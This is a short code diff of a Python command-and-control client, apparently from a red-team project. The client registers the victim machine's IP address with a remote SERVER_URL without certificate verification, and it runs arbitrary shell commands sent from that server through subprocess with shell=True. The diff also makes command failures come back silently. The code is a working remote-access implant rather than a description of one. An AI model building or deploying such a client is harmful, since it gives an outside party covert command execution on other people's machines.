@@ -13,7 +13,6 @@ def register():
     elif (platform.system() == "Linux"):
         ip = subprocess.run("hostname -I", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
 
-    # response = requests.get(f"{SERVER_URL}/log-client", params={'client_id': ip}, verify='/Users/leahk/workspace/projects/redteam/C2/cert.pem') # send ip
     response = requests.get(f"{SERVER_URL}/register-client", params={'client_id': ip}, verify=False)
     if response.status_code == 200:
         return response.json()['client_id'] # need server to return to the client what its ID is
@@ -31,8 +30,9 @@ def execute_command(cmd):
     try:
         result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
         return result.stdout.decode() + result.stderr.decode() # decode standard output
-    except subprocess.CalledProcessError as e: # umm uhh
-        return str(e)
+    except subprocess.CalledProcessError:
+        pass
+    return ""
 
 def main():
     global CLIENT_ID
